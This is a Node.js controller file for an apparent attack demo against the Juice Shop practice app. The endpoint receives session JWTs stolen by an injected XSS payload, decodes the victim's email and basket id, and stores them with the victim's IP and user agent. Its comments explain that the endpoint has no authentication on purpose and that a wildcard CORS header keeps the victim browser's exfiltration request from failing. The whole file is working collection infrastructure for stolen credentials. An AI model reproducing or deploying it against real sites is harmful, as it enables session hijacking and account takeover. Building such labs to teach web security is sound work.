const crypto = require('crypto');
const lootStore = require('../models/lootStore');
const { decodeJwtEmail, decodeJwtBid } = require('../services/decodeJwtEmail');
const { LOOT_RATE_LIMITER } = require('../../shared/infrastructure/rateLimiter');

// Loot from the QR arsenal: the XSS injected into Juice Shop exfiltrates the
// session JWT here. This trap endpoint intentionally has NO auth — the victim
// browser has no session with this app and cannot send a token. Loot is rate
// limited and persisted through the loot store (Postgres when DATABASE_URL is
// set, memory otherwise).
async function collectLoot(req, res) {
  const rawToken = String(req.query.loot || '').slice(0, 2000);
  const stolen = rawToken !== '' && rawToken !== 'none';
  const entry = {
    id: crypto.randomUUID(),
    ts: Date.now(),
    ip: req.ip,
    ua: String(req.headers['user-agent'] || '').slice(0, 120),
    stolen,
    email: null,
    bid: null,
    token: rawToken,
  };
  if (stolen) {
    entry.email = decodeJwtEmail(rawToken);
    entry.bid = decodeJwtBid(rawToken);
  }
  await lootStore.addLoot(entry);
  // The exfiltration fetch runs with mode:'no-cors' from the victim's browser;
  // the wildcard header keeps the request from being flagged as an error there.
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.status(204).end();
}

module.exports = { collectLoot, lootRateLimiter: LOOT_RATE_LIMITER };
